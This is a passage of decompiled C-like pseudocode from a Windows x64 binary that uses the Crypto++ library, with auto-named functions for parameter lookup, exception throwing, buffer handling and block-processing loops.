  char v6; // bl
  __int64 v7; // rdi
  __int64 v8; // rax
  _QWORD *v9; // rax
  __int64 v10; // rax
  __int64 v12; // [rsp+30h] [rbp-38h]
  char *Str2; // [rsp+38h] [rbp-30h]
  __int64 v14; // [rsp+40h] [rbp-28h]
  void *Src; // [rsp+48h] [rbp-20h]
  char v16; // [rsp+50h] [rbp-18h]
  char v17; // [rsp+51h] [rbp-17h]

  sub_14004DB10((__int64)&v12, a1 - 32, a2, a3, a4, 0i64);
  v4 = Src;
  if ( v17 )
  {
    v5 = sub_140004CA0(Src, "SubgroupOrder", 0xDui64);
    sub_140004CA0(v5, &unk_1400AB2F0, 1ui64);
  }
  v6 = v16;
  v7 = v12;
  if ( !v16 && !strcmp("SubgroupOrder", Str2) )
  {
    sub_1400293A0("SubgroupOrder", (__int64)&CryptoPP::cls_097 `RTTI Type Descriptor', v14);
    v8 = sub_14002A7E8(v7 + **(signed int **)(v7 + 8) + 8i64);
    sub_14003C670((__int64)v4, v8);
    v6 = 1;
  }
  if ( v17 )
  {
    v9 = sub_140004CA0(v4, "SubgroupGenerator", 0x11ui64);
    sub_140004CA0(v9, &unk_1400AB2F0, 1ui64);
  }
  if ( v6 || strcmp("SubgroupGenerator", Str2) )
    return v6;
  sub_1400293A0("SubgroupGenerator", (__int64)&CryptoPP::cls_097 `RTTI Type Descriptor', v14);
  v10 =  Concurrency::details::_Concurrent_queue_base_v4::`vcall'{8,{flat}}(**(signed int **)(v7 + 8) + v7 + 8);
  sub_14003C670((__int64)v4, v10);
  return 1;
}
// 14004E458: using guessed type __int64 __fastcall  Concurrency::details::_Concurrent_queue_base_v4::`vcall'{8,{flat}}(_QWORD);

//----- (0000000140050C30) ----------------------------------------------------
__int64 __fastcall sub_140050C30(__int64 *a1, __int64 a2)
{
  __int64 v2; // rbx
  __int64 v3; // rdi
  __int64 *v4; // rsi
  unsigned int v5; // eax

  v2 = *a1;
  v3 = a2;
  v4 = a1;
  v5 = (*(__int64 (**)(void))(*a1 + 64))();
  return (*(__int64 (__fastcall **)(__int64 *, __int64, _QWORD))(v2 + 168))(v4, v3, v5);
}

//----- (0000000140050C70) ----------------------------------------------------
__int64 __fastcall sub_140050C70(__int64 a1, __int64 a2)
{
  return sub_140062E60(*(const __m128i **)(a1 + 192), a2);
}

//----- (0000000140050C80) ----------------------------------------------------
signed __int64 sub_140050C80()
{
  return 2i64;
}

//----- (0000000140050C90) ----------------------------------------------------
__int64 __fastcall sub_140050C90(__int64 a1)
{
  return *(unsigned int *)(a1 + 32);
}

//----- (0000000140050CA0) ----------------------------------------------------
void __fastcall sub_140050CA0(__int64 a1)
{
  sub_140061C80(*(_OWORD **)(a1 + 192));
}

//----- (0000000140050CB0) ----------------------------------------------------
__int64 __fastcall sub_140050CB0(__int64 a1)
{
  return (*(__int64 (__fastcall **)(signed __int64))(*(_QWORD *)(*(_QWORD *)(a1 + 8) + 8i64) + 56i64))(*(_QWORD *)(a1 + 8) + 8i64);
}

//----- (0000000140050CC0) ----------------------------------------------------
bool __fastcall sub_140050CC0(__int64 a1, __int64 a2)
{
  return a2 == (*(__int64 (**)(void))(*(_QWORD *)a1 + 32i64))();
}

//----- (0000000140050CE0) ----------------------------------------------------
char sub_140050CE0()
{
  return 0;
}

//----- (0000000140050CF0) ----------------------------------------------------
__int64 __fastcall sub_140050CF0(__int64 a1)
{
  return (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)(a1 + 48) + 56i64))(a1 + 48);
}

//----- (0000000140050D00) ----------------------------------------------------
__int64 __fastcall sub_140050D00(__int64 a1, __int64 a2)
{
  __int64 result; // rax
  char v3; // [rsp+28h] [rbp-80h]
  __int64 v4; // [rsp+38h] [rbp-70h]
  __int64 v5; // [rsp+40h] [rbp-68h]
  __int64 (__fastcall **v6)(void *); // [rsp+50h] [rbp-58h]
  int v7; // [rsp+68h] [rbp-40h]
  char Dst; // [rsp+70h] [rbp-38h]
  __int64 v9; // [rsp+80h] [rbp-28h]
  __int64 v10; // [rsp+88h] [rbp-20h]

  result = (*(__int64 (__fastcall **)(__int64, const char *, void *(__fastcall ***)(type_info *, unsigned int), __int64, signed __int64))(*(_QWORD *)a2 + 8i64))(
             a2,
             "OutputStringPointer",
             &std::basic_string<char,std::char_traits<char>,std::allocator<char>> * `RTTI Type Descriptor',
             a1 + 24,
             -2i64);
  if ( !(_BYTE)result )
  {
    v5 = 15i64;
    v4 = 0i64;
    v3 = 0;
    sub_140004F20(&v3, byte_1400A3400, 0i64);
    std::exception::exception((std::exception *)&v6);
    v6 = &off_1400A8798;
    v7 = 1;
    v10 = 15i64;
    v9 = 0i64;
    Dst = 0;
    sub_140004DF0(&Dst, &v3, 0i64, 0xFFFFFFFFFFFFFFFFui64);
    v6 = &off_1400A8798;
    CxxThrowException(&v6, &_TI3_AVcls_001_CryptoPP__);
  }
  return result;
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400A1930: using guessed type _QWORD std::exception::exception(std::exception *__hidden this);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);
// 1400D3B30: using guessed type int _TI3_AVcls_001_CryptoPP__;
// 1400D92A0: using guessed type void *(__fastcall **std::basic_string<char,std::char_traits<char>,std::allocator<char>> * `RTTI Type Descriptor')(type_info *this, unsigned int);

//----- (0000000140050E00) ----------------------------------------------------
void __noreturn sub_140050E00()
{
  _QWORD *v0; // rbx
  __int64 (__fastcall **v1)(void *); // [rsp+30h] [rbp-78h]
  int v2; // [rsp+48h] [rbp-60h]
  char Dst; // [rsp+50h] [rbp-58h]
  __int64 v4; // [rsp+60h] [rbp-48h]
  __int64 v5; // [rsp+68h] [rbp-40h]
  void *Src; // [rsp+70h] [rbp-38h]
  unsigned __int64 v7; // [rsp+88h] [rbp-20h]

  v0 = sub_140050480(&Src);
  std::exception::exception((std::exception *)&v1);
  v1 = &off_1400A8798;
  v2 = 0;
  v5 = 15i64;
  v4 = 0i64;
  Dst = 0;
  sub_140004DF0(&Dst, v0, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  v1 = &off_1400A8798;
  if ( v7 >= 0x10 )
    operator delete(Src);
  v1 = &off_1400A8798;
  CxxThrowException(&v1, &_TI4_AUcls_077___cls_069_VFilter_CryptoPP___CryptoPP__);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400A1930: using guessed type _QWORD std::exception::exception(std::exception *__hidden this);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);
// 1400D4300: using guessed type int _TI4_AUcls_077___cls_069_VFilter_CryptoPP___CryptoPP__;

//----- (0000000140050EC0) ----------------------------------------------------
__int64 __fastcall sub_140050EC0(__int64 a1)
{
  return (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)(a1 - 16) + 8i64))(a1 - 16);
}

//----- (0000000140050ED0) ----------------------------------------------------
__int64 __fastcall sub_140050ED0(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v3; // rbx
  __int64 v4; // r14
  void (__fastcall ***v5)(_QWORD, _QWORD); // rbp
  void (__fastcall ***i)(_QWORD, _QWORD); // rdi
  unsigned __int64 v7; // rax
  void *v8; // rdx
  __int64 v9; // rax
  void *v10; // rdx
  char v12; // [rsp+30h] [rbp-B8h]
  char v13; // [rsp+38h] [rbp-B0h]
  __int64 v14; // [rsp+48h] [rbp-A0h]
  void *Memory; // [rsp+50h] [rbp-98h]
  __int64 v16; // [rsp+60h] [rbp-88h]
  __int64 (__fastcall **v17)(void *); // [rsp+70h] [rbp-78h]
  __int64 (__fastcall **v18)(); // [rsp+78h] [rbp-70h]

  v16 = -2i64;
  v3 = a2;
  v4 = a1;
  sub_14005F770((__int64)&v17, a3, 48);
  v17 = &off_1400A9AC0;
  v18 = &off_1400ACF80;
  sub_14004C8A0((__int64)&v17, (int *)&v12, 2, 1u, 1u);
  (*(void (__fastcall **)(__int64, __int64 (__fastcall ***)(void *)))(*(_QWORD *)(v4 + 56) + 8i64))(v4 + 56, &v17);
  *(_DWORD *)(v4 + 48) = (unsigned __int64)sub_140045340(v4 + 56) - 1;
  v5 = *(void (__fastcall ****)(_QWORD, _QWORD))(v4 + 104);
  for ( i = *(void (__fastcall ****)(_QWORD, _QWORD))(v4 + 96); i != v5; i += 5 )
    (**i)(i, 0i64);
  *(_QWORD *)(v4 + 104) = *(_QWORD *)(v4 + 96);
  while ( !sub_1400608C0((__int64)&v17) )
  {
    v7 = (*(__int64 (__fastcall **)(__int64, char *, __int64 (__fastcall ***)(void *)))(*(_QWORD *)v3 + 32i64))(
           v3,
           &v13,
           &v17);
    sub_1400539D0((__int64 *)(v4 + 96), v7);
    v8 = Memory;
    memset(Memory, 0, 8 * v14);
    free(v8);
  }
  if ( *(_QWORD *)(v4 + 96) != *(_QWORD *)(v4 + 104) && (**(unsigned __int8 (__fastcall ***)(__int64))v3)(v3) )
  {
    v9 = (*(__int64 (__fastcall **)(__int64, char *, _QWORD))(*(_QWORD *)v3 + 16i64))(v3, &v13, *(_QWORD *)(v4 + 96));
    sub_14003C670(v4 + 8, v9);
    v10 = Memory;
    memset(Memory, 0, 8 * v14);
    free(v10);
  }
  sub_140060990((__int64)&v17);
  return sub_14005F840(&v17);
}
// 14005F840: using guessed type __int64 __fastcall sub_14005F840(_QWORD);
// 1400A9AC0: using guessed type __int64 (__fastcall *off_1400A9AC0)(void *);
// 1400ACF80: using guessed type __int64 (__fastcall *off_1400ACF80)();

//----- (0000000140051070) ----------------------------------------------------
void __noreturn sub_140051070()
{
  char v0; // [rsp+28h] [rbp-80h]
  __int64 v1; // [rsp+38h] [rbp-70h]
  __int64 v2; // [rsp+40h] [rbp-68h]
  __int64 (__fastcall **v3)(void *); // [rsp+50h] [rbp-58h]
  int v4; // [rsp+68h] [rbp-40h]
  char Dst; // [rsp+70h] [rbp-38h]
  __int64 v6; // [rsp+80h] [rbp-28h]
  __int64 v7; // [rsp+88h] [rbp-20h]

  v2 = 15i64;
  v1 = 0i64;
  v0 = 0;
  sub_140004F20(&v0, byte_1400A3400, 0i64);
  std::exception::exception((std::exception *)&v3);
  v3 = &off_1400A8798;
  v4 = 0;
  v7 = 15i64;
  v6 = 0i64;
  Dst = 0;
  sub_140004DF0(&Dst, &v0, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  v3 = &off_1400A8798;
  CxxThrowException(&v3, &_TI3_AVcls_004_CryptoPP__);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400A1930: using guessed type _QWORD std::exception::exception(std::exception *__hidden this);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);
// 1400D3B70: using guessed type int _TI3_AVcls_004_CryptoPP__;

//----- (0000000140051130) ----------------------------------------------------
__int64 __fastcall sub_140051130(__int64 a1)
{
  return *(unsigned int *)(a1 + 24);
}

//----- (0000000140051150) ----------------------------------------------------
__int64 __fastcall sub_140051150(__int64 a1)
{
  return (*(__int64 (**)(void))(*(_QWORD *)a1 + 8i64))();
}

//----- (0000000140051160) ----------------------------------------------------
__int64 __fastcall sub_140051160(__int64 a1)
{
  return (*(__int64 (**)(void))(**(_QWORD **)(a1 + 16) + 8i64))();
}

//----- (0000000140051170) ----------------------------------------------------
__int64 __fastcall sub_140051170(__int64 a1, __int64 a2)
{
  _QWORD *v2; // rbx
  __int64 v3; // rdi
  __int64 result; // rax

  v2 = (_QWORD *)a2;
  v3 = a1;
  if ( a2 )
  {
    sub_140023920(a2, a1);
    *v2 = &off_1400AB2F8;
    result = *(_QWORD *)(v3 + 32);
    v2[4] = result;
  }
  return result;
}
// 1400AB2F8: using guessed type __int64 (__fastcall *off_1400AB2F8)(void *);

//----- (00000001400511C0) ----------------------------------------------------
__int64 __fastcall sub_1400511C0(__int64 a1, __int64 a2)
{
  __int64 v2; // rbx
  __int64 v3; // rdi
  __int64 result; // rax

  v2 = a2;
  v3 = a1;
  if ( a2 )
  {
    sub_140023920(a2, a1);
    *(_QWORD *)v2 = &off_1400AABC0;
    result = *(unsigned __int8 *)(v3 + 32);
    *(_BYTE *)(v2 + 32) = result;
  }
  return result;
}
// 1400AABC0: using guessed type __int64 (__fastcall *off_1400AABC0)(void *);

//----- (0000000140051210) ----------------------------------------------------
void __fastcall sub_140051210(__int64 a1, unsigned __int64 a2)
{
  unsigned __int64 v2; // r8
  unsigned __int64 v3; // rbx
  void *v4; // rdx
  __int64 v5; // rsi
  void *v6; // rax

  v2 = *(_QWORD *)(a1 + 8);
  v3 = a2;
  v4 = *(void **)(a1 + 16);
  v5 = a1;
  if ( v2 == v3 )
  {
    *(_QWORD *)(a1 + 16) = v4;
    *(_QWORD *)(a1 + 8) = v3;
  }
  else
  {
    memset(v4, 0, v2);
    if ( v2 < 0x10 )
      free(v4);
    else
      aligned_free(v4);
    sub_1400255A0(v3);
    if ( v3 )
    {
      if ( v3 < 0x10 )
        v6 = sub_14003A000(v3);
      else
        v6 = sub_140039F50(v3);
      *(_QWORD *)(v5 + 8) = v3;
      *(_QWORD *)(v5 + 16) = v6;
    }
    else
    {
      *(_QWORD *)(v5 + 8) = 0i64;
      *(_QWORD *)(v5 + 16) = 0i64;
    }
  }
}

//----- (00000001400512D0) ----------------------------------------------------
__int64 __fastcall sub_1400512D0(__int64 a1)
{
  __int64 v1; // rax

  v1 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)(a1 - 8) + 136i64))(a1 - 8);
  return (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v1 + 16i64))(v1);
}

//----- (00000001400512F0) ----------------------------------------------------
__int64 __fastcall sub_1400512F0(__int64 a1)
{
  __int64 v1; // rax

  v1 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)(a1 - 8) + 136i64))(a1 - 8);
  return (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v1 + 8i64))(v1);
}

//----- (0000000140051310) ----------------------------------------------------
__int64 __fastcall sub_140051310(__int64 a1)
{
  return (*(__int64 (__fastcall **)(signed __int64))(*(_QWORD *)(*(_QWORD *)(a1 + 8) + 8i64) + 40i64))(*(_QWORD *)(a1 + 8) + 8i64);
}

//----- (0000000140051430) ----------------------------------------------------
void __noreturn sub_140051430()
{
  char v0; // [rsp+28h] [rbp-80h]
  __int64 v1; // [rsp+38h] [rbp-70h]
  __int64 v2; // [rsp+40h] [rbp-68h]
  __int64 (__fastcall **v3)(void *); // [rsp+50h] [rbp-58h]
  int v4; // [rsp+68h] [rbp-40h]
  char Dst; // [rsp+70h] [rbp-38h]
  __int64 v6; // [rsp+80h] [rbp-28h]
  __int64 v7; // [rsp+88h] [rbp-20h]

  v2 = 15i64;
  v1 = 0i64;
  v0 = 0;
  sub_140004F20(&v0, byte_1400A3400, 0i64);
  std::exception::exception((std::exception *)&v3);
  v3 = &off_1400A8798;
  v4 = 0;
  v7 = 15i64;
  v6 = 0i64;
  Dst = 0;
  sub_140004DF0(&Dst, &v0, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  v3 = &off_1400A8798;
  CxxThrowException(&v3, &_TI3_AVcls_004_CryptoPP__);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400A1930: using guessed type _QWORD std::exception::exception(std::exception *__hidden this);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);
// 1400D3B70: using guessed type int _TI3_AVcls_004_CryptoPP__;

//----- (00000001400514F0) ----------------------------------------------------
void __fastcall sub_1400514F0(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  __int64 v4; // rdi
  __int64 v5; // r12
  __int64 v6; // rbx
  __int64 v7; // r13
  bool v8; // r15
  unsigned __int64 v9; // r14
  __int64 v10; // rcx
  __int64 v11; // rsi
  __int64 v12; // rax
  void *v13; // rdx
  void *v14; // rdx
  void *v15; // rdx
  __int64 v16; // rcx
  void *v17; // rdx
  void *v18; // rdx
  void *v19; // rdx
  void *v20; // rdx
  void *v21; // rdx
  void *v22; // rdx
  char v23; // [rsp+20h] [rbp-B8h]
  __int64 v24; // [rsp+30h] [rbp-A8h]
  void *v25; // [rsp+38h] [rbp-A0h]
  char v26; // [rsp+48h] [rbp-90h]
  __int64 v27; // [rsp+58h] [rbp-80h]
  void *Memory; // [rsp+60h] [rbp-78h]
  char v29; // [rsp+70h] [rbp-68h]
  __int64 v30; // [rsp+80h] [rbp-58h]
  void *v31; // [rsp+88h] [rbp-50h]
  char v32; // [rsp+98h] [rbp-40h]
  __int64 v33; // [rsp+A8h] [rbp-30h]
  void *v34; // [rsp+B0h] [rbp-28h]
  __int64 v35; // [rsp+C0h] [rbp-18h]
  char v36; // [rsp+C8h] [rbp-10h]
  __int64 v37; // [rsp+D8h] [rbp+0h]
  void *v38; // [rsp+E0h] [rbp+8h]

  v35 = -2i64;
  v4 = a4;
  v5 = a3;
  v6 = a1;
  v7 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a2 + 24i64))(a2);
  sub_14003C210(&v29);
  sub_14003C210(&v32);
  sub_14003C000((__int64)&v29, v4);
  v8 = (*(unsigned __int8 (__fastcall **)(__int64))(*(_QWORD *)v7 + 40i64))(v7) && *(_DWORD *)(v6 + 48) > 1u;
  v9 = 0i64;
  v10 = *(_QWORD *)(v6 + 104) - *(_QWORD *)(v6 + 96);
  if ( ((unsigned __int64)((unsigned __int128)(v10 * (signed __int128)7378697629483820647i64) >> 64) >> 63)
     + ((signed __int64)((unsigned __int128)(v10 * (signed __int128)7378697629483820647i64) >> 64) >> 4) > 1 )
  {
    do
    {
      sub_140046AE0((__int64)&v29, (__int64)&v32, (__int64)&v29, *(_DWORD *)(v6 + 48));
      sub_14004C750((__int64)&v32, (__int64)&v29);
      if ( v8 && sub_140048010((__int64)&v29, (unsigned int)(*(_DWORD *)(v6 + 48) - 1)) )
      {
        sub_14003CDE0((__int64)&v29);
        v11 = sub_140024710((__int64)&v36, v6 + 56, (__int64)&v29);
        v12 = (*(__int64 (__fastcall **)(__int64, unsigned __int64))(*(_QWORD *)v7 + 32i64))(
                v7,
                *(_QWORD *)(v6 + 96) + 40 * v9);
        sub_14003C000((__int64)&v23, v12);
        sub_14003C000((__int64)&v26, v11);
        sub_1400538D0(v5, &v23);
        v13 = Memory;
        memset(Memory, 0, 8 * v27);
        free(v13);
        v14 = v25;
        memset(v25, 0, 8 * v24);
        free(v14);
        v15 = v38;
        v16 = v37;
      }
      else
      {
        sub_14003C000((__int64)&v23, *(_QWORD *)(v6 + 96) + 40 * v9);
        sub_14003C000((__int64)&v26, (__int64)&v29);
        sub_1400538D0(v5, &v23);
        v17 = Memory;
        memset(Memory, 0, 8 * v27);
        free(v17);
        v15 = v25;
        v16 = v24;
      }
      memset(v15, 0, 8 * v16);
      free(v15);
      v9 = (unsigned int)(v9 + 1);
    }
    while ( v9 < ((unsigned __int64)((unsigned __int128)((signed __int64)(*(_QWORD *)(v6 + 104) - *(_QWORD *)(v6 + 96))
                                                       * (signed __int128)7378697629483820647i64) >> 64) >> 63)
               + ((signed __int64)((unsigned __int128)((signed __int64)(*(_QWORD *)(v6 + 104) - *(_QWORD *)(v6 + 96))
                                                     * (signed __int128)7378697629483820647i64) >> 64) >> 4) );
  }
  sub_14003C000((__int64)&v23, *(_QWORD *)(v6 + 96) + 40 * v9);
  sub_14003C000((__int64)&v26, (__int64)&v29);
  sub_1400538D0(v5, &v23);
  v18 = Memory;
  memset(Memory, 0, 8 * v27);
  free(v18);
  v19 = v25;
  memset(v25, 0, 8 * v24);
  free(v19);
  v20 = v31;
  memset(v31, 0, 8 * v30);
  free(v20);
  v21 = v34;
  memset(v34, 0, 8 * v33);
  free(v21);
  v22 = Memory;
  memset(Memory, 0, 8 * v27);
  free(v22);
}
// 1400538D0: using guessed type __int64 __fastcall sub_1400538D0(_QWORD, _QWORD);

//----- (0000000140051800) ----------------------------------------------------
signed __int64 sub_140051800(__int64 a1, unsigned __int64 a2, unsigned __int64 a3, ...)
{
  _QWORD *v3; // r15
  __int64 v4; // rbx
  size_t v5; // rdi
  unsigned __int64 v6; // rbp
  unsigned __int64 v7; // rsi
  __int64 v8; // r14
  unsigned __int64 v9; // r13
  __int64 v10; // rax
  size_t v11; // rdx
  __int64 v12; // r12
  signed __int64 result; // rax
  va_list v14; // rcx
  __int64 v15; // rbx
  unsigned int v16; // ebx
  bool v17; // zf
  bool v18; // zf
  char v19; // al
  unsigned __int64 v20; // r8
  _QWORD *v21; // [rsp+30h] [rbp-48h]
  unsigned int v22; // [rsp+80h] [rbp+8h]
  size_t v23; // [rsp+98h] [rbp+20h]
  va_list va; // [rsp+98h] [rbp+20h]
  va_list va1; // [rsp+A0h] [rbp+28h]

  va_start(va1, a3);
  va_start(va, a3);
  v23 = va_arg(va1, _QWORD);
  v3 = (_QWORD *)(a1 - 8);
  v4 = a1;
  v5 = v23;
  v6 = a3;
  v7 = a2;
  v8 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)(a1 - 8) + 144i64))(a1 - 8);
  v22 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v8 + 16i64))(v8);
  v9 = (*(unsigned int (__fastcall **)(__int64))(*(_QWORD *)v8 + 8i64))(v8);
  v10 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v8 + 24i64))(v8);
  v11 = *(_QWORD *)(v4 + 80);
  v12 = v10;
  result = v4 + 80;
  v21 = (_QWORD *)(v4 + 80);
  if ( v11 )
  {
    va_copy(v14, va);
    if ( v5 >= v11 )
      v14 = (va_list)(v4 + 80);
    v15 = *(_QWORD *)v14;
    (*(void (__fastcall **)(_QWORD *, unsigned __int64, size_t, unsigned __int64, __int64))(*v3 + 152i64))(
      v3,
      v7,
      v12 + v22 - v11,
      v6,
      *(_QWORD *)v14);
    result = (signed __int64)v21;
    *(_QWORD *)result -= v15;
    v5 -= v15;
    v6 += v15;
    v7 += v15;
  }
  if ( v5 )
  {
    result = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v8 + 40i64))(v8);
    if ( (_BYTE)result )
    {
      result = v22;
      if ( v5 >= v22 )
      {
        v16 = 0;
        if ( (_DWORD)v9 == 1 )
          goto LABEL_28;
        if ( !(_DWORD)v9 || ((_DWORD)v9 - 1) & (unsigned int)v9 )
          v17 = v7 % v9 == 0;
        else
          v17 = (((_DWORD)v9 - 1) & (unsigned int)v7) == 0;
        result = v17;
        if ( !v17 )
          goto LABEL_22;
        v18 = !(_DWORD)v9 || ((_DWORD)v9 - 1) & (unsigned int)v9 ? v6 % v9 == 0 : (((_DWORD)v9 - 1) & (unsigned int)v6) == 0;
        if ( v18 )
        {
LABEL_28:
          v19 = (*(__int64 (__fastcall **)(_QWORD *))(v3[1] + 104i64))(v3 + 1);
          v20 = v6;
        }
        else
        {
          memcpy((void *)v7, (const void *)v6, v5);
          v19 = (*(__int64 (__fastcall **)(_QWORD *))(v3[1] + 104i64))(v3 + 1);
          v20 = v7;
        }
        LOBYTE(v16) = v19 == 0;
        (*(void (__fastcall **)(__int64, unsigned __int64, unsigned __int64, _QWORD, size_t))(*(_QWORD *)v8 + 48i64))(
          v8,
          v7,
          v20,
          v16,
          v5 / v22);
        result = v5 - v5 % v22;
        v6 += result;
        v7 += result;
        v5 %= v22;
      }
    }
LABEL_22:
    while ( v5 >= v22 )
    {
      (*(void (__fastcall **)(__int64))(*(_QWORD *)v8 + 32i64))(v8);
      result = (*(__int64 (__fastcall **)(_QWORD *, unsigned __int64, __int64, unsigned __int64, _QWORD))(*v3 + 152i64))(
                 v3,
                 v7,
                 v12,
                 v6,
                 v22);
      v5 -= v22;
      v6 += v22;
      v7 += v22;
    }
    if ( v5 )
    {
      (*(void (__fastcall **)(__int64))(*(_QWORD *)v8 + 32i64))(v8);
      (*(void (__fastcall **)(_QWORD *, unsigned __int64, __int64, unsigned __int64, size_t))(*v3 + 152i64))(
        v3,
        v7,
        v12,
        v6,
        v5);
      result = (signed __int64)v21;
      *v21 = v22 - v5;
    }
  }
  return result;
}

//----- (0000000140051A40) ----------------------------------------------------
__int64 __fastcall sub_140051A40(__int64 a1)
{
  return (*(__int64 (**)(void))(*(_QWORD *)a1 + 24i64))();
}

//----- (0000000140051A50) ----------------------------------------------------
__int64 __fastcall sub_140051A50(_QWORD *a1, __int64 a2, char a3)
{
  __int64 v3; // rdi
  signed __int64 v4; // rbx
  char v5; // si
  __int64 v6; // rbp
  __int64 v7; // rax
  char v8; // ST20_1

  v3 = a1[6];
  v4 = (signed __int64)(a1 + 6);
  v5 = a3;
  v6 = a2;
  v7 = (*(__int64 (**)(void))(*a1 + 328i64))();
  v8 = v5;
  return (*(__int64 (__fastcall **)(signed __int64, __int64, __int64, void **, char))(v3 + 248))(
           v4,
           v7,
           v6,
           &qword_1400D8080,
           v8);
}

//----- (0000000140051AB0) ----------------------------------------------------
__int64 __fastcall sub_140051AB0(__int64 a1, char a2)
{
  char v2; // di
  __int64 v3; // rbx
  __int64 v4; // rax

  v2 = a2;
  v3 = a1;
  v4 = (*(__int64 (**)(void))(*(_QWORD *)a1 + 328i64))();
  return sub_140039A30(v3 + 48, v4, (__int64)&qword_1400D8080, v2);
}

//----- (0000000140051AF0) ----------------------------------------------------
__int64 __fastcall sub_140051AF0(__int64 a1, unsigned int *a2, char a3)
{
  char v3; // di
  unsigned int *v4; // rsi
  __int64 v5; // rbx
  __int64 v6; // rax

  v3 = a3;
  v4 = a2;
  v5 = a1;
  v6 = (*(__int64 (**)(void))(*(_QWORD *)a1 + 328i64))();
  return sub_140039C00(v5 + 48, v6, v4, (__int64)&qword_1400D8080, v3);
}

//----- (0000000140051B40) ----------------------------------------------------
__int64 __fastcall sub_140051B40(__int64 a1, char *a2, unsigned __int64 a3)
{
  unsigned __int64 v3; // rbx
  char *v4; // rsi
  __int64 v5; // rdi
  __int64 v6; // rcx
  unsigned __int64 v7; // rdx
  __int64 *v8; // rcx
  unsigned __int64 v9; // rdx
  __int64 v10; // rax
  __int64 v11; // r9
  __int64 v12; // r8
  __int64 v13; // rax

  v3 = a3;
  v4 = a2;
  v5 = a1;
  if ( a3 )
  {
    v6 = *(_QWORD *)(a1 + 24);
    v7 = *(_QWORD *)(v6 + 16);
    if ( a3 < v7 && v7 + a3 > *(_QWORD *)(v6 + 24) )
      std::basic_string<char,std::char_traits<char>,std::allocator<char>>::reserve(v6, 2 * v7);
    v8 = *(__int64 **)(v5 + 24);
    v9 = v8[3];
    if ( v9 < 0x10 )
      v10 = *(_QWORD *)(v5 + 24);
    else
      v10 = *v8;
    v11 = v8[2];
    v12 = v11 + v10;
    if ( v9 < 0x10 )
      v13 = *(_QWORD *)(v5 + 24);
    else
      v13 = *v8;
    sub_1400310C0(v8, v11 + v13, v12, v4, (__int64)&v4[v3]);
  }
  return 0i64;
}
// 14000DEB0: using guessed type __int64 __fastcall std::basic_string<char,std::char_traits<char>,std::allocator<char>>::reserve(_QWORD, _QWORD);

//----- (0000000140051BD0) ----------------------------------------------------
void __noreturn sub_140051BD0()
{
  _QWORD *v0; // rbx
  __int64 (__fastcall **v1)(void *); // [rsp+30h] [rbp-78h]
  int v2; // [rsp+48h] [rbp-60h]
  char Dst; // [rsp+50h] [rbp-58h]
  __int64 v4; // [rsp+60h] [rbp-48h]
  __int64 v5; // [rsp+68h] [rbp-40h]
  void *Src; // [rsp+70h] [rbp-38h]
  unsigned __int64 v7; // [rsp+88h] [rbp-20h]

  v0 = sub_140050480(&Src);
  std::exception::exception((std::exception *)&v1);
  v1 = &off_1400A8798;
  v2 = 0;
  v5 = 15i64;
  v4 = 0i64;
  Dst = 0;
  sub_140004DF0(&Dst, v0, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  v1 = &off_1400A8798;
  if ( v7 >= 0x10 )
    operator delete(Src);
  v1 = &off_1400A8798;
  CxxThrowException(&v1, &_TI4_AUcls_077___cls_069_VFilter_CryptoPP___CryptoPP__);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400A1930: using guessed type _QWORD std::exception::exception(std::exception *__hidden this);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);
// 1400D4300: using guessed type int _TI4_AUcls_077___cls_069_VFilter_CryptoPP___CryptoPP__;

//----- (0000000140051C90) ----------------------------------------------------
void __noreturn sub_140051C90()
{
  void **v0; // rbx
  __int64 (__fastcall **v1)(void *); // [rsp+30h] [rbp-78h]
  int v2; // [rsp+48h] [rbp-60h]
  char Dst; // [rsp+50h] [rbp-58h]
  __int64 v4; // [rsp+60h] [rbp-48h]
  __int64 v5; // [rsp+68h] [rbp-40h]
  char Src; // [rsp+70h] [rbp-38h]

  v0 = sub_14004FF80(&Src);
  std::exception::exception((std::exception *)&v1);
  v1 = &off_1400A8798;
  v2 = 0;
  v5 = 15i64;
  v4 = 0i64;
  Dst = 0;
  sub_140004DF0(&Dst, v0, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  v1 = &off_1400A8798;
  CxxThrowException(&v1, &_TI3_AVcls_004_CryptoPP__);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400A1930: using guessed type _QWORD std::exception::exception(std::exception *__hidden this);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);
// 1400D3B70: using guessed type int _TI3_AVcls_004_CryptoPP__;

//----- (0000000140051D30) ----------------------------------------------------
void __noreturn sub_140051D30()
{
  void **v0; // rbx
  __int64 (__fastcall **v1)(void *); // [rsp+30h] [rbp-78h]
  int v2; // [rsp+48h] [rbp-60h]
  char Dst; // [rsp+50h] [rbp-58h]
  __int64 v4; // [rsp+60h] [rbp-48h]
  __int64 v5; // [rsp+68h] [rbp-40h]
